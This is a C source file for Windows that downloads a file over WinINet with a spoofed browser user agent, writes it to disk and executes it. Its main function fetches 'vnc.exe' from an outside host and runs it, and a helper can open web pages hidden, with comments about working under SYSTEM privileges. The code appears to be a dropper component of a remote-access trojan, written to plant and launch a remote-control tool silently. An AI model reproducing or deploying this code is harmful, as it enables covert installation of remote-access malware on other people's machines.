
#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
// #include <process.h>

// GCC lwininet ws2_32
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
#define S_OK                                   ((HRESULT)0L)
#define S_FALSE                                ((HRESULT)1L)
#define false                                  FALSE
#define true                                   TRUE
#define bool                                   BOOL
#define ERROR_SUCCESS                           0L
#define SERVER_HEARTS                           0
// #define SERVER_HEARTS_SHELL                     13
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
    HINTERNET   hInternet, hUrl;
    HANDLE      hFile;
    char        buffer[1024];
    DWORD       dwBytesRead = 0;
    DWORD       dwBytesWritten = 0;
    BOOL        bIsFirstPacket = true;
    BOOL        bRet = true;
    
    hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
    if (hInternet == NULL)
        return false;
    
    hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL)
        return false;
    
    hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE)
    {
        do
        {
            memset(buffer, 0, sizeof(buffer));
            InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
            WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
        } while(dwBytesRead > 0);
        CloseHandle(hFile);
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return bRet;
}

DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,UINT8 execute)
{
    int nUrlLength;
    char    *lpURL = NULL;
    char    *lpFileName = NULL;
    nUrlLength = strlen((char *)lparam);
    if (nUrlLength == 0)
        return false;
    
    lpURL = (char *)malloc(nUrlLength + 1);
    
    memcpy(lpURL, lparam, nUrlLength + 1);
    if (save_path!=NULL){
        lpFileName = save_path;
    }else{
        lpFileName = strrchr(lpURL, '/') + 1;
    }
    
    if (lpFileName == NULL)
        return false;

    if (!http_get(lpURL, lpFileName))
    {
        return false;
    }

    if (execute){
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi;
        si.cb = sizeof si;
        si.lpDesktop = "WinSta0\\Default"; 
        CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }

    return true;
}

//OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL); 显示打开网页
//OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);   隐藏打开网页
BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
    if (strlen(lpszURL) == 0)
        return FALSE;

    // System 权限下不能直接利用shellexecute来执行
    char    *lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
    HKEY    hKey;
    char    strIEPath[MAX_PATH];
    LONG    nSize = sizeof(strIEPath);
    char    *lpstrCat = NULL;
    memset(strIEPath, 0, sizeof(strIEPath));
    
    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return FALSE;
    RegQueryValue(hKey, NULL, strIEPath, &nSize);
    RegCloseKey(hKey);

    if (lstrlen(strIEPath) == 0)
        return FALSE;

    lpstrCat = strstr(strIEPath, "%1");
    if (lpstrCat == NULL)
        return FALSE;

    lstrcpy(lpstrCat, lpszURL);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    if (nShowCmd != SW_HIDE)
        si.lpDesktop = "WinSta0\\Default"; 

    CreateProcess(NULL, strIEPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    return 0;
}
int main(){
    DownManager("http://tg.9bie.org:805/vnc.exe","d:\\vnc.exe",1);
}